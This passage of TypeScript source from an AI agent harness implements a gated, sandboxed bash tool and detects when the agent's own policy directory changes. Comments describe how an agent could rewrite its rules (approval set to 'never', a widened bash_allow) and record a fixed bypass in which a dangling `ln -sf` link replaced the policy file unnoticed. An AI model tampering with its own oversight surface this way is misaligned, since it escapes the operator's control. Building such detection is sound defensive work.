  // preview, and asked about whatever the gate says under repo_code = true.
  const runs = repoCodeRuns(command);
  const askRepo = runs.length > 0 && repoCodeAsks(ctx);
  if (needsApproval("bash", ctx.gate) || askRepo) {
    const ok = await ctx.approve({
      tool: "bash",
      summary: askRepo ? `bash (runs repository code): ${command}` : `bash: ${command}`,
      preview: [...command.split("\n").map((l) => `  $ ${l}`), ...repoCodeNote(runs, ctx.root).map((l) => `  # ${l}`)],
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: "Refused: the user declined to run this command.",
        summary: `bash — denied`,
      };
    }
  }

  // A command that already timed out this turn will time out again, and the
  // second 120s buys exactly the information the first one did. Refuse it
  // instead, and say what would work -- a declared refusal, at no wall cost,
  // rather than a fourth identical stall.
  const commandKey = command.trim().replace(/\s+/g, " ");
  if (ctx.timedOutCommands?.has(commandKey)) {
    return {
      code: TOOL_FAILED,
      content:
        `Refused: this exact command already timed out after ${ctx.timeoutMs}ms in this turn, ` +
        `so running it unchanged will time out again and spend the same budget for the same result.\n\n` +
        `Do one of these instead:\n` +
        `  - start it in the background and poll the log:\n` +
        `      ${backgroundRecipe(command)}\n` +
        `    then read that log on a later step\n` +
        `  - narrow it so it finishes inside the limit (a single test, a smaller range)\n` +
        `  - or say plainly that this step cannot be completed within the tool timeout.`,
      summary: `bash — refused (already timed out this turn)`,
    };
  }

  // Pinned before the command runs so drift can be attributed to it. See
  // surfaceHashOf: bash is arbitrary shell, so the surface is detected moving
  // rather than prevented from moving.
  const surfaceBefore = surfaceHashOf(ctx);
  // Same reasoning one level out: whether the command changed the worktree is
  // observed, not guessed from its text. Feeds the nudge, not the verify gate.
  // Where this command will actually operate. A command that cd's elsewhere, or
  // installs into /usr/local, does work the ctx.root stamp cannot see.
  const shellCwd = ((): string | undefined => {
    const m = /(?:^|\s|&&|;)\s*cd\s+("[^"]+"|'[^']+'|[^\s;&|]+)/.exec(command);
    if (!m) return undefined;
    const raw = m[1].replace(/^["']|["']$/g, "");
    // Absolute only; a relative cd stays inside the root and is already
    // covered. "Absolute" includes a Windows drive path -- `C:\work` and
    // `C:/work` -- which the POSIX-only test missed, so on Windows a turn that
    // cd'd out of the root and did its work there moved nothing this could see.
    // That is the premise the anti-flailing nudge reads, and it fired on agents
    // that were working correctly for exactly this reason on Unix once already.
    const absolute = raw.startsWith("/") || /^[A-Za-z]:[\\/]/.test(raw);
    if (!absolute) return undefined;
    // Git Bash spells C:\work as /c/work. Node resolves that to C:\c\work, so
    // the stamp walked a directory that does not exist and saw no change.
    const msys = /^\/([A-Za-z])(?:\/(.*))?$/.exec(raw);
    if (process.platform === "win32" && msys) return `${msys[1].toUpperCase()}:\\${(msys[2] ?? "").replace(/\//g, "\\")}`;
    return raw;
  })();
  const worktreeBefore = worktreeStampOf(ctx, shellCwd);

  // The docker sandbox bind-mounts the root at the same absolute path inside a
  // Linux container. `C:\work` is not a path there, and with no getuid the
  // mapping fell back to --user 0:0 -- root. Refused, named, rather than run
  // in a container that cannot see the repository.
  if (ctx.exec?.mode === "docker" && process.platform === "win32") {
    return {
      code: TOOL_FAILED,
      content:
        "Refused: [sandbox] exec = \"docker\" is not supported on native Windows yet. " +
        "It mounts the repository at its host path inside a Linux container, and a " +
        "drive-letter path does not exist there. Set exec = \"off\" for this machine, " +
        "or run gnomon inside WSL where the sandbox works.",
      summary: "bash — refused (docker sandbox unsupported on Windows)",
    };
  }

  const startedAt = Date.now();
  // The timeout, clamped to the time left before `--deadline` (less its
  // margin). At least a second, so a command started at the wire still gets
  // to report. Unclamped, and the same number as before, without a deadline.
  const limitMs =
    ctx.deadlineAt === undefined ? ctx.timeoutMs : Math.max(1000, Math.min(ctx.timeoutMs, ctx.deadlineAt - startedAt));
  const clamped = limitMs < ctx.timeoutMs;
  // A stable, unique name so a cancelled or timed-out turn can remove the
  // container. Killing the process group stops `docker run`, not the container
  // it started -- the work would keep going with nobody watching it.
  const sandboxName = `gnomon-${process.pid}-${startedAt.toString(36)}`;
  let spawned: string;
  try {
    spawned = sandboxCommand(command, ctx, sandboxName);
  } catch (e) {
    if (!(e instanceof RootWriteError)) throw e;
    return {
      code: TOOL_FAILED,
      content: `Refused: ${e.message}`,
      summary: "bash — refused (sandbox could not be set up safely)",
    };
  }
  const sandboxed = spawned !== command;

  // Refused, not silently run under a different language. See posixShell().
  const shellBin = posixShell();
  if (shellBin === null) {
    return {
      code: TOOL_FAILED,
      content: NO_POSIX_SHELL,
      summary: "bash — refused (no POSIX shell on this machine)",
    };
  }

  // From here until docker run has returned -- or the container is confirmed
  // removed -- gnomon runs no git on the host (git_safe liveContainer).
  if (sandboxed) containerStarted(sandboxName, () => dockerContainerGone(sandboxName));

  return new Promise<ToolOutcome>((done) => {
    const proc = spawn(shellBin, ["-c", spawned], {
      cwd: ctx.root,
      // The marker that says the agent is running this (AGENT_SESSION_ENV).
      env: agentEnv(ctx.agentSession),
      // stdin closed, stdout/stderr piped. An inherited stdin pipe that nobody
      // ever writes to makes any command that reads stdin block until the tool
      // timeout kills it -- `cat` with no argument, an npm prompt, a git
      // credential ask. Nothing here can answer them, so they get EOF instead.
      stdio: ["ignore", "pipe", "pipe"],
      // detached puts the command in its own process group, so killTree can
      // signal the group rather than only the `sh -c` in front of the real
      // work. Windows has no process groups to signal and `detached` there
      // means something else entirely -- killTree uses taskkill /T instead.
      detached: process.platform !== "win32",
      // On the host, network = false is enforced only as the intent filter
      // above (bashNetworkEgress); the process itself can still open sockets.
      // Under exec = "docker" the container gets --network none instead.
    });
    let stdout = "";
    let stderr = "";
    let settled = false;
    // Resolves when the shell itself has exited, however that happened.
    const exited = new Promise<void>((ok) => {
      if (proc.exitCode !== null || proc.signalCode !== null) ok();
      else proc.once("exit", () => ok());
    });

    const timer = setTimeout(async () => {
      if (settled) return;
      settled = true;
      await settleKill(killTree(proc, sandboxed ? sandboxName : undefined), exited);
      const containerLeft = sandboxed && !(await removeContainer(sandboxName));
      // What the command printed before it was killed is evidence the harness
      // already holds: the failing test, the last line of a build, the prompt it
      // was blocked on. Discarding it left the model with nothing to act on but
      // the fact of the timeout, and the only move that leaves is to run the
      // same command again. Report the elapsed limit, then hand back both ends
      // of what was captured.
      const captured = [
        stdout ? `stdout:\n${stdout}` : "stdout: (empty)",
        stderr ? `stderr:\n${stderr}` : "",
      ]
        .filter(Boolean)
        .join("\n");
      releasePipes(proc);
      // Opt-in line cap (CX3); unchanged text and context when none is declared.
      const cappedCapture = capLines(captured, ctx.maxLines?.bash, ctx, `bash-timeout`);
      const drift = surfaceDrift(ctx, surfaceBefore);
      const movedTree = worktreeMoved(ctx, worktreeBefore, shellCwd);
      // So the next identical call is refused for free rather than stalling.
      // Not when the deadline cut it short: the command may well fit the
      // ordinary limit, and the refusal would quote a limit it never had.
      if (!clamped) ctx.timedOutCommands?.add(commandKey);
      done({
        code: TOOL_FAILED,
        worktree_changed: movedTree,
        content:
          (clamped
            ? `Command stopped after ${limitMs}ms, the time left before this task's deadline, and was killed. Output captured before the kill:\n`
            : `Command timed out after ${ctx.timeoutMs}ms and was killed. Output captured before the kill:\n`) +
          clampEnds(cappedCapture.text, cappedCapture.ctx, `bash-timeout`) +
          `\n\nIt did not finish, so this output is partial. Re-running it unchanged will time out again: ` +
          `narrow it, or start it in the background and poll:\n      ${backgroundRecipe(command)}\n` +
          `    then read ${JOB_LOG_DIR}/job.log on a later step.` +
          (drift ? `\n\n${drift.notice}` : "") +
          (containerLeft ? CONTAINER_NOT_GONE : ""),
        summary: `bash — timeout${clamped ? " (deadline)" : ""}${drift ? " · surface changed" : ""}`,
        surface_drift: drift ?? undefined,
      });
    }, limitMs);

    // The operator pressing Esc must reach the process, not merely be noticed
    // once it has finished.
    const onAbort = async () => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      await settleKill(killTree(proc, sandboxed ? sandboxName : undefined), exited);
      const containerLeft = sandboxed && !(await removeContainer(sandboxName));
      releasePipes(proc);
      const atDeadline = ctx.signal?.reason === DEADLINE_ABORT;
      done({
        code: TOOL_FAILED,
        content:
          (atDeadline
            ? `Stopped at this task's deadline after ${Date.now() - startedAt}ms. Output captured before the stop:\n`
            : `Cancelled by the operator after ${Date.now() - startedAt}ms. Output captured before the stop:\n`) +
          clampEnds(
            [stdout ? `stdout:\n${stdout}` : "stdout: (empty)", stderr ? `stderr:\n${stderr}` : ""]
              .filter(Boolean)
              .join("\n"),
            ctx,
            `bash-cancelled`
          ) +
          (containerLeft ? CONTAINER_NOT_GONE : ""),
        summary: atDeadline ? `bash — stopped at the deadline` : `bash — cancelled`,
      });
    };
    ctx.signal?.addEventListener("abort", onAbort, { once: true });

    proc.stdout?.on("data", (d: Buffer) => (stdout += d.toString()));
    proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
    proc.on("error", (err) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      // The shell never started, so neither did a container.
      if (sandboxed) containerGone(sandboxName);
      done({
        code: TOOL_FAILED,
        content: `Could not run command: ${err.message}`,
        summary: `bash — failed to spawn`,
      });
    });
    // `exit`, NOT `close`.
    //
    // close waits for the child's stdio streams to close as well as the child
    // to end. A backgrounded job inherits sh's pipe write-ends, so the pipes
    // stay open for as long as the JOB runs, and close never fires though sh
    // exited in milliseconds. Measured: `sleep 30 & echo started` blocked the
    // full timeout and was then SIGKILLed by killTree, so the model was handed
    // proof the job had started AND a timeout, while the job itself was dead.
    // `sleep 30 >log 2>&1 &` returned in 2ms -- the difference was only whether
    // BOTH streams were redirected, which is not a distinction any model can be
    // expected to get right every time. It is also the harness's own advice for
    // long commands, so the recommended path was the broken one.
    //
    // A short drain after exit collects output still in flight; the process is
    // already gone, so this waits on bytes, not on the job.
    proc.on("exit", (exit, signal) => {
      if (settled) return;
      setTimeout(() => finish(exit, signal), 40);
    });
    // ...but only when the streams are still open. `close` means sh has exited AND
    // both pipes are drained, so nothing is left in flight: finish at once. It
    // fires within a millisecond of `exit` for any command that leaves no job
    // holding the pipes, which is nearly every command. The 40 ms drain used to
    // be paid on every one of them: UX1b measured gnomon at 48 ms of its own time
    // per tool turn against goose's 22, and the drain was 40 of the 48. The
    // backgrounded-job case above still ends on exit + 40 ms, as before.
    proc.on("close", (exit, signal) => finish(exit, signal));
    const finish = (exit: number | null, signal?: NodeJS.Signals | null) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      // `docker run --rm` returned with the container's status: it has exited,
      // and with it every process in it. A docker run that died on a signal,
      // or failed itself (125: it may have lost the daemon with the container
      // running), says nothing of the kind; the container stays registered
      // until docker reports it gone.
      if (sandboxed) {
        if (exit !== null && exit !== 125) {
          containerGone(sandboxName);
        } else {
          try {
            spawn("docker", ["rm", "-f", sandboxName], { stdio: "ignore", detached: true }).unref();
          } catch {
            /* the lazy check in git_safe still asks */
          }
        }
      }
      // stderr BEFORE stdout when the command failed, and both ends kept.
      //
      // The old order put stderr last and clamped head-only, so a chatty build
      // that failed returned 32KB of "Compiling crate-1..3999" and dropped the
      // compiler error entirely -- the model was told the build failed and shown
      // nothing about why, with a footer advising it to "narrow it with grep",
      // which cannot be done for a build. Measured: 4000 progress lines plus one
      // E0308 on stderr came back with the error absent.
      //
      // The timeout path already reasons this way ("the reason it was still
      // running is usually the last thing it printed"); a non-zero exit deserves
      // the same treatment, and its diagnostics are the point of the call.
      const failed = exit !== 0;
      const body = failed
        ? [
            `exit: ${exit}`,
            stderr ? `stderr:\n${stderr}` : "stderr: (empty)",
            stdout ? `stdout:\n${stdout}` : "stdout: (empty)",
          ]
            .filter(Boolean)
            .join("\n")
        : [
            `exit: ${exit}`,
            stdout ? `stdout:\n${stdout}` : "stdout: (empty)",
            stderr ? `stderr:\n${stderr}` : "",
          ]
            .filter(Boolean)
            .join("\n");
      const drift = surfaceDrift(ctx, surfaceBefore);
      const movedTree = worktreeMoved(ctx, worktreeBefore, shellCwd);
      // Opt-in line cap (CX3), before the byte cap; unchanged text and context
      // when none is declared.
      const capped = capLines(body, ctx.maxLines?.bash, ctx, `bash-exit`);
      done({
        code: TOOL_OK,
        worktree_changed: movedTree,
        // null when the child died on a signal: left undefined rather than
        // coerced, because "killed" is not an exit status.
        shell_exit: typeof exit === "number" ? exit : undefined,
        content:
          (failed
            ? clampEnds(capped.text, capped.ctx, `bash-exit`)
            : clamp(capped.text, capped.ctx, `bash-exit`)) +
          pipelineStatusNote(command) +
          (drift ? `\n\n${drift.notice}` : ""),
        // `exit` is null when the child died on a signal, and "exit null" then
        // failed the verify gate's /exit (-?\d+)/ and fell through to its
        // `code === 0 ? 0 : 1` default -- reporting a segfaulted or OOM-killed
        // check as PASSED. Name the signal instead, so nothing can read it as a
        // clean zero.
        summary:
          (exit === null && signal
            ? `bash — killed by ${signal}`
            : `bash — exit ${exit}`) + (drift ? " · surface changed" : ""),
        surface_drift: drift ?? undefined,
      });
    };
  });
}

/**
 * Compile one glob to an anchored RegExp.
 *
 * Globs, not regexes, unlike bash_allow. A path pattern written as a regex is
 * over-permissive by default in a way that is easy to miss: `docs/` matches
 * `src/docs/anything`, because an unanchored regex matches a substring and `.`
 * is any character. A scope that silently permits more than it reads is worse
 * than no scope, so paths take the notation where the obvious spelling is also
 * the safe one.
 *
 * `*` stops at a separator, `**` crosses them, and `**` followed by a
 * separator also matches nothing at all — so `**\/*.md` covers both `NOTES.md`
 * and `docs/NOTES.md`.
 */
export function globToRegExp(glob: string, flags = ""): RegExp {
  let out = "";
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i];
    if (c === "*") {
      if (glob[i + 1] === "*") {
        if (glob[i + 2] === "/") {
          out += "(?:.*/)?";
          i += 2;
        } else {
          out += ".*";
          i += 1;
        }
      } else {
        out += "[^/]*";
      }
    } else if (c === "?") {
      out += "[^/]";
    } else {
      out += c.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    }
  }
  return new RegExp(`^${out}$`, flags);
}

/**
 * Is this role allowed to modify this path?
 *
 * Matches the path *after* resolution, relative to the root, so `docs/../src`
 * is judged as `src` rather than as something starting with `docs/`. Checking
 * the argument as written would make the scope bypassable by anyone who typed
 * two dots.
 */
/**
 * Whether `abs` lands inside the `.gnomon/` surface.
 *
 * The surface is the thing every behaviour is a function of: the tool list,
 * the approval gate, the per-role `bash_allow` and `write_allow`. An agent
 * that can write there can rewrite the rules it is being judged by — set
 * `approval = "never"`, widen `bash_allow`, hand itself the `edit` tool — and
 * the next turn runs under the surface it authored. It also silently moves
 * the surface hash, which is the one identifier a session is traced by.
 *
 * So `write` and `edit` stop at the boundary regardless of role. Changing the
 * surface stays a human act, done in an editor. The `skill` tool is the sole
 * sanctioned way in, and it does not come through here: it writes proposals
 * to `.gnomon/skills/proposed/`, which are inert until `gnomon skill accept`
 * moves them — deliberately changing the hash, with a person doing it.
 */
/**
 * The current surface hash, or null if it cannot be computed.
 *
 * `write` and `edit` stop at the `.gnomon/` boundary, but `bash` cannot be
 * held to that: the command is arbitrary shell, and an allow-list that tried
 * to spot every way a process can touch a file would be a guess dressed up as
 * a guarantee. So the surface is not *prevented* from moving under bash — it
 * is *detected*, by re-reading the hash on the far side of the command.
 *
 * Detection rather than prevention is the honest primitive here, and it is
 * the one the harness already relies on: the hash is what makes a session
 * reproducible, so a hash that moved mid-session is exactly the fact a reader
 * needs, whatever mechanism moved it.
 */
/** A surface hash that moved while a command ran. */
export interface SurfaceDrift {
  before: string;
  after: string;
  notice: string;
}

/**
 * Compare the surface hash against the one pinned before a command ran.
 *
 * Returns null when nothing moved, which is the overwhelmingly common case
 * and costs one walk of `.gnomon/`.
 */
export function surfaceDrift(
  ctx: ToolContext,
  before: string | null
): SurfaceDrift | null {
  if (!before) return null;
  const after = surfaceHashOf(ctx);
  if (after === before) return null;
  if (!after) {
    // A surface that hashed before the call and cannot be hashed after it
    // MOVED. This returned null, "nothing moved", so `ln -sf <nowhere>
    // .gnomon/policy.toml` -- a dangling link, which the manifest walk cannot
    // stat -- replaced the policy and was never reported (LN8). Reported
    // here, so the loop says so and tries to reload.
    return {
      before,
      after: "unhashable",
      notice:
        `[gnomon] WARNING: that command changed .gnomon/ so that it can no ` +
        `longer be hashed (a dangling link or an unreadable file) — the ` +
        `surface hash was ${before.slice(0, 12)}. The rules this session is ` +
        `running under are no longer the ones it started with, and a surface ` +
        `that cannot be hashed cannot be verified. Do not try to undo this; ` +
        `say in your final answer that the surface moved mid-session.`,
    };
  }
  return {
    before,
    after,
    notice:
      `[gnomon] WARNING: that command changed .gnomon/ — the surface hash ` +
      `moved from ${before.slice(0, 12)} to ${after.slice(0, 12)}. The rules ` +
      `this session is running under are no longer the ones it started with, ` +
      `and the earlier turns were recorded against a surface that no longer ` +
      `exists. Do not try to undo this — no git checkout, no revert of ` +
      `.gnomon/: bash is not gated on that path, so an attempt would ` +
      `discard whatever the operator has uncommitted there, and if changing ` +
      `.gnomon/ was the task it would revert the work itself. Carry on, and ` +
      `say in your final answer that the surface moved mid-session.`,
  };
}

export function surfaceHashOf(ctx: ToolContext): string | null {
  const dir = ctx.config?.gnomonDir ?? join(ctx.root, ".gnomon");
  try {
    return recomputeManifest(dir).surface_hash;
  } catch {
    return null;
  }
}

/**
 * A cheap, deterministic stamp of the worktree: which files exist, and their
 * size and mtime.
 *
 * Used only to answer "did this shell command change anything?" — the question
 * the anti-flailing nudge was getting wrong. In the 48-task benchmark arm, 49
 * of the 50 nudged trials had made no `write`/`edit` call at all, because the
 * model was editing through heredocs and `sed -i`; the counter saw an idle
 * agent and told a working one to stop.
 *
 * Observation, not inference: a pattern list over `sed|tee|make` would be a
 * behaviour-deciding rule living outside the content-hashed surface, and it
 * would be wrong on the first command it had not been taught. It never reads
 * file contents.
 *
 * Returns null when the tree cannot be stamped, which callers must read as
 * "unknown", never as "unchanged". A walk that reached WALK_MAX_FILES is one of
 * those. It used to return a stamp of the first 20,000 files it happened to
 * visit, and on a 30,000-file tree 7 of 20 sampled single-file edits did not
 * move it (#62): a partial answer reported as a whole one, so the command was
 * recorded as changing nothing and counted toward the nudge.
 *
 * A tree of STAMP_WALK_BELOW files or more, inside a git work tree, is asked of
 * git (gitStampOf) instead. The walk stat'd every file in JS before AND after
 * every command: per tool turn, 50ms at 0 files, 104ms at 5k and 260ms at 20k,
 * where goose stayed flat at ~22ms (#62, UX1c). Smaller trees, and trees
 * outside git, are walked as they always were.
 */
export function worktreeStampOf(ctx: ToolContext, alsoRoot?: string): string | null {
  try {
    const below = ctx.stampWalkBelow ?? STAMP_WALK_BELOW;
    const h = createHash("sha256");
    // A second root, when the shell is working somewhere else. This walked only
    // ctx.root, so a task whose work is an apt install, an /etc config or a
    // system service could never move the stamp — and the anti-flailing nudge
    // fired on an agent that was working correctly. One trial printed
    // "98 call(s) without changing a file" immediately after postconf -e,
    // service start and chown, with two of its tests already passing. The
    // nudge was not wrong to fire on its premise; the premise was false.
    //
    // Either root unknown makes the whole stamp unknown, even when the other
    // one moved. Weaker than it could be; never wrong.
    const roots = alsoRoot && alsoRoot !== ctx.root ? [ctx.root, alsoRoot] : [ctx.root];
    for (const base of roots) {
      // Small: walked, exact under its bound and cheaper than starting git.
      // Null here only means "bigger than that".
      let one: string | null | undefined = walkStampOf(base, below);
      if (one === null) {
        one = gitStampOf(base);
        if (one === undefined) one = walkStampOf(base, WALK_MAX_FILES);
      }
      if (one === null) return null;
      // Which method made it is inside `one`: a git stamp and a walk stamp of
      // the same tree are different digests, so a root that changes method
      // between before and after reads as moved, never as unchanged. It can
      // only change method by gaining or losing files across the bound -- a
      // change -- or, at worst, files under .gnomon/ or .gnomon-loops/, which
      // the bound counts and the stamp ignores: reported as moved, never hid.
      h.update(`${base}\0${one}\n`);
    }
    return h.digest("hex");
  } catch {
    return null;
  }
}

/**
 * Did the worktree move? Only a stamp taken on both sides can say so. Three
 * answers, and the third is not a spelling of the second:
 *
 *   true   both stamps exist and differ;
 *   false  both stamps exist and agree;
 *   null   either side could not be stamped -- unknown.
 *
 * This returned false for unknown, on the reasoning that unknown must not read
 * as changed (that would disarm the nudge). That half holds. Reading it as
 * unchanged is the same mistake the other way: it counts a working agent's
 * commands toward "N calls without changing a file". So unknown is said, and
 * the nudge, the fold, the verify gate and the audit each decide what it means
 * for them (prompt_loop.ts).
 */
export function worktreeMoved(
  ctx: ToolContext,
  before: string | null,
  alsoRoot?: string
): boolean | null {
  if (before === null) return null;
  const after = worktreeStampOf(ctx, alsoRoot);
  if (after === null) return null;
  return after !== before;
}

/**
 * The stamp's exclusions, as a question about one path relative to the root
 * being stamped. Shared by the walk and the git stamp, so the two give the same
 * answer about the same tree.
 *
 * .gnomon/ has its own stamp (surfaceHashOf) and its own meaning; a surface
 * edit is drift, not progress.
 *
 * .gnomon-loops/ is gnomon's OWN state, the same family as .gnomon-audit and
 * .gnomon-sessions in NEVER_WALKED: `gnomon loop install` puts cron on a
 * schedule and every tick appends to cron.log and rewrites <loop>.json. That
 * made the tree move under a step that changed nothing, so `worktree_changed`
 * came back true for read-only work and the anti-flailing nudge lost its
 * premise -- exactly what adding coverage/ to NEVER_WALKED fixed on 2026-09-05,
 * arriving instead through a directory the harness writes itself. It is
 * excluded HERE rather than in NEVER_WALKED so glob and grep can still read it;
 * only the "did the agent change anything" question ignores it. (String, not
 * loops.ts's LOOP_STATE_DIR: loops.ts imports this module.)
 *
 * NEVER_WALKED itself the walk applies on its own. git has never heard of it,
 * so a path git lists is checked against it here: otherwise an un-ignored
 * `.gnomon-shadow/` or `coverage/` comes back into the stamp through git status,
 * and with it the false "changed" each was added to the list to stop.
 */
function stampSkips(rel: string, isDir: boolean): boolean {
  const segs = rel.replace(/\/+$/, "").split("/");
  if (segs[0] === ".gnomon" || segs[0] === ".gnomon-loops") return true;
  const dirs = isDir ? segs : segs.slice(0, -1);
  return dirs.some((d) => NEVER_WALKED.has(d));
}

/**
 * Below this many files the walk is the cheaper stamp, and the stamp walks.
 *
 * A git stamp costs a process (two, the first time): on gx10 ~3.5ms a status
 * at 0 files, against the walk's 0.2ms, and the walk catches up at about 700
 * files. On the Windows runner a git process costs ~35ms -- this repository's
 * own 482-file tree took ~45ms more a stamp through git than walked, and a
 * 26-call test that passed in 3.9s on master ran out its 5s. Where the walk
 * pays ~4us a file on Linux and several times that on NTFS, 2,000 leaves
 * small trees, which is most daily work, as fast as they were, and sends
 * everything past it to git, where the walk's cost and its cap were the bug.
 */
const STAMP_WALK_BELOW = 2_000;

/**
 * The walk. Null when it reached `max`: the files past it were never looked
 * at, so a stamp would describe part of the tree while claiming to describe
 * all of it. At WALK_MAX_FILES that is "unknown"; at a smaller bound it is
 * the caller's cue to ask git instead.
 */
function walkStampOf(base: string, max: number): string | null {
  const files = walkFiles(base, base, max);
  if (files.length >= max) return null;
  const h = createHash("sha256");
  h.update("walk\n");
  for (const rel of files) {
    if (stampSkips(rel, false)) continue;
    let st: Stats;
    try {
      st = statSync(join(base, rel));
    } catch {
      continue; // vanished mid-walk: the next stamp will differ anyway
    }
    h.update(`${rel}:${st.size}:${st.mtimeMs}\n`);
  }
  return h.digest("hex");
}

/** A status this slow is worth falling back from, not waiting on twice a command. */
const GIT_STAMP_TIMEOUT_MS = 5_000;
/** Far past what a WALK_MAX_FILES budget of listed paths can print. */
const GIT_STAMP_MAX_BUFFER = 32 * 1024 * 1024;

/** stdout of one git call in `cwd`, or null if it did not start or did not exit 0. */
function stampGit(cwd: string, args: string[]): string | null {
  const r = safeGit(args, {
    cwd,
    stdio: ["ignore", "pipe", "ignore"],
    timeout: GIT_STAMP_TIMEOUT_MS,
    maxBuffer: GIT_STAMP_MAX_BUFFER,
    hot: true,
  });
  return r.error || r.status !== 0 ? null : r.stdout;
}

/** The directory holding the nearest `.git` at or above `dir`, or null. */
function nearestDotGit(dir: string): string | null {
  for (let d = resolve(dir); ; ) {
    if (existsSync(join(d, ".git"))) return d;
    const up = dirname(d);
    if (up === d) return null;
    d = up;
  }
}

/**
 * Where `base` sits inside its git work tree, as git spells it ("" at the top,
 * "sub/dir/" below it), or null when base is not in a work tree.
 *
 * The prefix, not `--show-toplevel`: git prints the toplevel as a real path,
 * and the root may not be one -- macOS's tmpdir is /var -> /private/var, a
 * Windows temp path can carry 8.3 short names. Joined to the toplevel, every
 * listed path would come out "outside" the root and the stamp would fall back
 * to the walk for exactly the trees it was written for. Stripping git's own
 * prefix and joining the rest to `base` never compares two spellings of a path.
 *
 * Asked once per root rather than twice per command: it costs as much as the
 * status call it serves, ~2ms each on gx10, and at 0 files that doubled the
 * stamp. The cached answer is reused only while the nearest `.git` above the
 * root is the one it was given under, so a `git init` or an `rm -rf .git` asks
 * again. GIT_DIR or GIT_WORK_TREE in the environment puts the repository where
 * no `.git` check can see, so with either set it always asks.
 *
 * `refreshed` is whether this process has run one ordinary status here yet;
 * see gitStampOf.
 */
interface GitRoot {
  near: string | null;
  prefix: string | null;
  refreshed: boolean;
}
const gitRoots = new Map<string, GitRoot>();

function gitRootOf(base: string): GitRoot | null {
  const envRepo = process.env.GIT_DIR !== undefined || process.env.GIT_WORK_TREE !== undefined;
  const near = nearestDotGit(base);
  // No .git anywhere above and none named by the environment: git's own
  // discovery would find nothing either, and a process to hear that costs ms.
  if (near === null && !envRepo) return null;
  const hit = gitRoots.get(base);
  if (hit && hit.near === near && !envRepo) return hit.prefix === null ? null : hit;
  const out = stampGit(base, ["rev-parse", "--is-inside-work-tree", "--show-prefix"]);
  const [inside, prefix] = (out ?? "").split("\n");
  const answer = inside === "true" && prefix !== undefined ? prefix : null;
  const entry: GitRoot = {
    near,
    prefix: answer,
    // Asked again under GIT_DIR, or after a .git appeared: the same repository
    // keeps the one refresh it already had.
    refreshed: hit !== undefined && hit.near === near && hit.prefix === answer && hit.refreshed,
  };
  gitRoots.set(base, entry);
  return answer === null ? null : entry;
}

/**
 * The stamp, asked of git. undefined when git cannot answer for this root --
 * not a work tree, no git, a failed or slow status, or a root git itself
 * ignores -- and the caller walks instead. null when git answered and the stamp
 * is still unknown: the budget below ran out.
 *
 * What it hashes:
 *   - HEAD's commit id. Every tracked file git does not list is identical to
 *     its copy there, so the id stands in for all of them. Without it a
 *     `git checkout` or `git pull` from one clean tree to another reads as no
 *     change.
 *   - every path `git status` lists -- modified, staged, deleted, renamed,
 *     untracked, ignored -- with its size and mtime, as the walk took them.
 *     Not git's status letters: those describe the index, and `git add` moves
 *     the index, not the tree. The walk never counted staging as work; nor
 *     does this.
 *   - the files inside a directory git lists without looking into: an ignored
 *     directory (`! out/`), a nested repository (`? vendor-x/`), a submodule.
 *     Walked, against the same budget.
 *
 * Ignored files are in it on purpose. The question is "did the agent change
 * the project", not "did it change what git tracks": a `.env` written for a
 * config task or a binary from `make` is gitignored and IS the work, and a
 * stamp blind to it fires the nudge on an agent doing its job -- the failure
 * this stamp exists to prevent. The walk saw them, so this does. What the walk
 * never entered (NEVER_WALKED) stays out, through stampSkips.
 *
 * One deliberate difference from the walk: a tracked file rewritten with the
 * same bytes (`touch`, a formatter that changed nothing) moved the walk's stamp
 * and does not move this one. git compares content, and that is the better
 * answer to the question.
 *
 * Locks. Every status after the first passes `--no-optional-locks`: this runs
 * beside the operator's own git and the agent's, a status that refreshes the
 * index holds index.lock while it does, and a `git commit` landing in that
 * moment fails. Editors pass it for the same reason. The FIRST status per root
 * per process is an ordinary one, refresh and all, because a racy index never
 * heals without one. A repository built and committed in one go -- a benchmark
 * fixture, a scaffold, a fresh clone's last second -- has entries git cannot
 * trust by stat and re-reads on every status. Measured: a 2,000-file one costs
 * ~20ms a status until refreshed and ~5ms after, and gnomon's own turn-start
 * `git diff --numstat HEAD` does not refresh it. One status as the operator
 * would run it, once a session, is the cost of not paying that twice a
 * command for the rest of it.
 *
 * Cost, measured on gx10 under load (refreshed index; walk in brackets): one
 * status 3.5ms at 0 files [0.2], 8.7ms at 5k [39], 25ms at 20k [162] and 53ms
 * at 50k [131, and 12 of 20 edits missed] -- git's parallel lstat of the index
 * and a readdir of every directory, in C. Small trees never get here
 * (STAMP_WALK_BELOW). The JS side is O(listed paths), in daily work the
 * handful being edited. There is no cap on the tracked tree: WALK_MAX_FILES
 * bounds only what has to be stat'd here, and past it the stamp is unknown
 * rather than partial.
 */
function gitStampOf(base: string): string | null | undefined {
  const root = gitRootOf(base);
  if (root === null || root.prefix === null) return undefined;
  const prefix = root.prefix;
  const out = stampGit(base, [
    ...(root.refreshed ? ["--no-optional-locks"] : []),
    "status",
    "--porcelain=v2",
    "-z",
    "--branch",
    "--no-ahead-behind",
    "--untracked-files=all",
    "--ignored=matching",
    "--",
    ".",
  ]);
  if (out === null) {
    gitRoots.delete(base);
    return undefined;
  }
  root.refreshed = true;

  // Collected, then sorted: git prints tracked changes, then untracked, then
  // ignored, so `git add` would reorder the same files into a new stamp.
  let head = "";
  const lines: string[] = [];
  let budget = WALK_MAX_FILES;
  const recs = out.split("\0");
  for (let i = 0; i < recs.length; i++) {
    const rec = recs[i]!;
    if (rec === "") continue;
    if (rec.startsWith("# branch.oid ")) {
      head = rec;
      continue;
    }
    // The other headers name the branch and its upstream. `git checkout -b`
    // and `git fetch` change them, and change no file.
    if (rec.startsWith("#")) continue;
    // Space-separated fields before the path, per porcelain v2. A rename or
    // copy (`2`) is followed by its original path as a record of its own.
    const kind = rec[0];
    const fields =
      kind === "1" ? 8 : kind === "2" ? 9 : kind === "u" ? 10 : kind === "?" || kind === "!" ? 1 : -1;
    // A record this parser was not written for: let the walk answer rather
    // than hash something misread.
    if (fields < 0) return undefined;
    let at = 0;
    for (let f = 0; f < fields; f++) {
      const space = rec.indexOf(" ", at);
      if (space < 0) return undefined;
      at = space + 1;
    }
    const paths = [rec.slice(at)];
    if (kind === "2") paths.push(recs[++i] ?? "");

    for (const p of paths) {
